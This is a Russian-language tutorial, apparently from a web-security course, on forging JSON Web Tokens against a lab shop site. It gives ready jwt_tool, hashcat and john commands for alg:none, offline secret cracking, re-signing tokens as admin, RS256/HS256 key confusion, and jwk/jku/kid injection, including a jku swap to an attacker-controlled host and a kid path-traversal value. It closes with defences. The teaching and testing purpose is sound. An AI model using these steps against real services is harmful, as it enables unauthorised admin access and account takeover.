## Задача

На `https://shop.acme-lab.test` сессия хранится не в обычной cookie, а в **JWT** (JSON Web Token) — компактном токене доступа. Мы декодировали его и увидели `{"user":"user","role":"user"}`. Вопрос: можно ли подделать `role` на `admin`?

Почти все атаки на JWT сводятся к одному: подпись либо **не проверяется**, либо проверяется **неправильно**. Разберём это на нашем токене.

## Анатомия JWT

Токен — три части через точку: `header.payload.signature`. Каждая часть закодирована в **base64url** (без `=`, символы `+`/`/` заменены на `-`/`_`).

- **header** — `{"alg":"HS256","typ":"JWT"}`: алгоритм и поля `kid`/`jwk`/`jku`.
- **payload** — **claims** (утверждения): `sub`, `role`, `uid`, `exp` (срок), `iss`, `aud`.
- **signature** — подпись: HMAC (HS*) или асимметричная (RS*/ES*).

Что проверять первым делом: `alg: none`, конфузию `RS256 → HS256`, слабый секрет HS256, инъекции в `jwk`/`jku`/`kid` и непроверяемые `exp`/`aud`/`iss`.

## Шаг 1: декодировать без проверки подписи

```bash
$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.abc
{"alg":"HS256","typ":"JWT"}.{"user":"user","role":"user"}
```

Вручную base64url требует вернуть паддинг и `+/`: `echo '<part>' | tr '_-' '/+' | base64 -d`. Но `jwt_tool` показывает всё сразу и подсвечивает подозрительное.

## Шаг 2: `alg:none` и null signature

Если сервер не проверяет подпись, достаточно поменять `alg` на `none` и убрать подпись:

```bash
$ python3 jwt_tool.py $TOKEN -X a          # alg:none
$ python3 jwt_tool.py $TOKEN -X n          # null signature (пустая подпись)
$ python3 jwt_tool.py $TOKEN -I -pc role -pv admin -S none
```

Проверяем на защищённом ресурсе:

```bash
$ curl -s https://shop.acme-lab.test/admin -H "Authorization: Bearer $FORGED" | grep -i admin
<h1>Admin panel</h1>
```

Вернулся «Admin panel» — подпись не проверяется. Это доказательство.

## Шаг 3: слабый секрет HS256 — офлайн-взлом

Если `alg:none` отклонён, но алгоритм HS256, секрет мог быть коротким. Подбираем **офлайн** (никогда не бруть токен онлайн):

```bash
# hashcat mode 16500 — JWT (HMAC)
$ hashcat -a 0 -m 16500 $TOKEN rockyou.txt
$ hashcat -a 0 -m 16500 $TOKEN words.txt -r best64.rule

# john
$ echo "$TOKEN" > jwt.txt
$ john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
```

Или прямо в `jwt_tool` (медленнее, без внешних форматов):

```bash
$ python3 jwt_tool.py $TOKEN -C -d rockyou.txt
[+] secret found: "secret"
```

## Шаг 4: подписать подделку

Найден секрет — подписываем свой payload с `role:admin`:

```bash
$ python3 jwt_tool.py $TOKEN -T -S hs256 -p secret -I -pc role -pv admin
[+] forged: eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ....
```

Проверяем `curl`-ом — и получаем доступ. Если секрет неизвестен, но публичный ключ есть, работает конфузия.

## Шаг 5: конфузия `RS256 → HS256`

Когда сервер принимает и RS256, и HS256, публичный ключ (он известен) можно использовать как HMAC-секрет:

```bash
$ curl -s https://shop.acme-lab.test/.well-known/jwks.json
$ python3 jwt_tool.py $TOKEN -X k -pk public.pem -T
```

Если сервер слепо берёт алгоритм из header и валидирует HS256 публичным ключом — токен принимается.

## Шаг 6: `jwk` / `jku` / `kid`

- **jwk** (встроенный ключ): сервер доверяет ключу внутри header → `jwt_tool.py $TOKEN -X i`.
- **jku** (URL с ключами): сервер скачивает JWKS по URL → подсовываем свой хост:
  `jwt_tool.py $TOKEN -X s -ju https://attacker.local/jwks.json`.
- **kid** (id ключа): если `kid` уходит в путь или SQL — инъекция:
  `jwt_tool.py $TOKEN -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""`.

## Шпаргалка: команды jwt_tool

| Задача | Команда |
|--------|---------|
| Декодировать токен | `jwt_tool.py $TOKEN` |
| alg:none | `jwt_tool.py $TOKEN -X a` |
| null signature | `jwt_tool.py $TOKEN -X n` |
| конфузия RS256→HS256 | `jwt_tool.py $TOKEN -X k -pk public.pem` |
| встроить свой jwk | `jwt_tool.py $TOKEN -X i` |
| подменить jku | `jwt_tool.py $TOKEN -X s -ju https://attacker/jwks.json` |
| кракнуть секрет | `jwt_tool.py $TOKEN -C -d rockyou.txt` |
| подписать своим секретом | `jwt_tool.py $TOKEN -T -S hs256 -p secret` |
| правка claim | `jwt_tool.py $TOKEN -I -pc role -pv admin -S hs256 -p secret` |
| проверить против цели | `jwt_tool.py -t https://target.local -rc "jwt=$TOKEN" -M pb` |

Режим `-M pb` — это **playbook**: `jwt_tool` сам прогоняет чеклист известных проблем по цели. Флаг `-cv Welcome` задаёт строку-маркер («canary»), по которой видно, что токен принят. Флаг `-r request.txt` позволяет подать целый сырой запрос из Burp — тогда инструмент сам подставит токен в нужное место.

## Полный прогон от начала до конца

1. Перехвати токен в Burp (Cookie/Authorization).
2. `jwt_tool.py $TOKEN` → декодировать, посмотреть `alg`, claims, `kid`.
3. `-X a` / `-X n` → проверить отсутствие проверки подписи.
4. `-C -d words.txt` или `hashcat -m 16500` → слабый секрет (офлайн).
5. `-T -S hs256 -p secret -I -pc role -pv admin` → подделка.
6. `curl` к защищённому ресурсу → до/после.

## Если не сработало

- **`alg:none` отклонён.** Пробуй `-X k` (конфузия), если есть публичный ключ.
- **Секрет не подбирается.** Он длинный/случайный — перебор бесполезен, ищи утечку ключа или `kid`/`jku`.
- **RS256 не ломается перебором.** Асимметричная подпись — приватным ключом; эксплуатируется только конфузия или утечка.
- **Токен принят, но доступа нет.** Проверь, какие claims реально авторизуют: `role`, `scope`, `admin`.
- **Сервер отклоняет всё.** Возможно, проверяются `exp`/`aud`/`iss` — правь и их.

## Что мы теперь знаем

- JWT = `header.payload.signature` в base64url.
- Быстрые атаки: `alg:none`, null signature, конфузия RS256→HS256.
- Слабый HS256-секрет ломается **офлайн** (`hashcat -m 16500`, `john`, `-C`).
- `jwk`/`jku`/`kid` — точки подмены ключа и инъекций.
- Найденный секрет позволяет подписать произвольный payload.

## На что смотреть дальше

- **Не бруть онлайн.** Взлом HS256 — офлайн; онлайн-попытки забанят IP.
- **Паддинг base64url.** При ручном декоде возвращай `=` и меняй `-_` на `+/`.
- **Валидная подпись ≠ безопасный токен.** Проверяй `exp`, `aud`, `iss` и подмену claims.
- **`kid` легко пропустить.** Инъекция в `kid` — частая точка входа.
- **JWT Editor в Burp.** Позволяет править и переподписывать токен прямо в прокси.

## Разбор: как читать JWT глазами атакующего

JWT — это три части, разделённые точками: заголовок, полезная нагрузка и подпись, каждая в base64url. Первое, что ты делаешь, — декодируешь первые две без всякой проверки: подпись не мешает читать содержимое. Уже здесь часто видно всё: `"alg":"HS256"`, роль пользователя, срок жизни. Если в нагрузке есть поле роли или `is_admin`, а подпись не проверяется на сервере, задача решена без криптоанализа.

Дальше — три классические проверки по порядку стоимости. Первая: меняет ли сервер поведение, если подпись убрать или поставить `alg:none`. Вторая: слабый ли секрет HS256 — гоняем по словарю (`hashcat -m 16500`). Третья: путаница алгоритмов — сервер ждёт RS256, но принимает HS256, подписанный публичным ключом как секретом. Каждая проверка дешёвая и однозначная.

Отдельно смотри на `kid` и `jku`. `kid` может указывать на файл, и тогда инъекция в него даёт path traversal или SQLi. `jku` может заставить сервер забрать ключ с твоего URL — это прямая подмена доверия. Оба поля редко валидируют строго, поэтому проверяй их сразу после базовых.

## Частые вопросы

**«Токен не подделывается, значит безопасно?»** Нет. Даже с валидной подписью проверь claims: `exp`, `nbf`, `aud`, `iss`. Часто токен живёт слишком долго, не привязан к аудитории или принимается после отзыва.

**«Как понять, что секрет слабый?»** Офлайн-брут по словарю: `hashcat -m 16500 token.txt wordlist.txt`. Если секрет нашёлся за секунды — он слабый по определению, независимо от длины.

**«Алгоритм `none` не проходит — что дальше?»** Пробуй конфузию RS/HS и подстановку `jku`/`jwk`. Если сервер использует библиотеку с историей CVE по JWT, проверь её версию — там были обходы проверки алгоритма.

## Защита

Явно фиксируй допустимый алгоритм на сервере (не доверяй полю `alg` из токена), используй сильный случайный секрет для HS256 или полноценные ключи для RS256. Валидируй `exp`, `iss`, `aud`, а не только подпись. Не позволяй `jku`/`jwk` указывать на произвольные URL и проверяй `kid` по белому списку. Храни токены с коротким сроком и поддерживай отзыв.

## JWT в OAuth/OIDC: подмена aud/iss/nonce

JWT — не только cookie сессии; в OIDC это **id_token**, а в OAuth — **access_token**. Здесь атаки отличаются от «слабого секрета»:

- **Подмена `aud` (audience).** Если сервис не проверяет `aud`, токен, выпущенный для *другого* клиента того же провайдера, принимается как свой. Это классический «confused deputy».
- **Подмена `iss` (issuer).** Мульти-провайдерные системы доверяют токену чужого issuer, если не сверяют подпись с правильным JWKS.
- **`nonce`/`state` не проверяются.** Это открывает replay и CSRF в потоке авторизации.
- **`alg` в id_token.** Confusion `RS256 -> HS256` здесь особенно опасен: публичный ключ провайдера превращается в HMAC-секрет.

Проверка: декодируйте токен, выпишите `iss`, `aud`, `exp`, `nonce` и убедитесь, что сервер сверяет каждое поле. Часто достаточно поменять `aud` на значение другого клиента и получить доступ — без всякого взлома подписи. Помните: подпись гарантирует *выпуск* токена, а не *право* им пользоваться.

## Куда дальше

Дальше (`web-tool-deser`) мы разберём инструменты десериализации — `ysoserial`, `phpggc` и `marshalsec`. А пока главное запомни: JWT ломается предсказуемо — сначала проверь `alg:none`, потом конфузию, потом слабый секрет офлайн.

## Где пригодится

- **CTF (Web):** JWT-задачи почти всегда решаются none/alg-confusion/слабым секретом.
- **Bug bounty:** слабый секрет и отсутствие проверки подписи — высокооплачиваемые находки.
- **Пентест:** проверка JWT входит в стандартный аудит аутентификации.
- **Работа (AppSec):** понимание ошибок JWT помогает ревьюить код выдачи и валидации токенов.
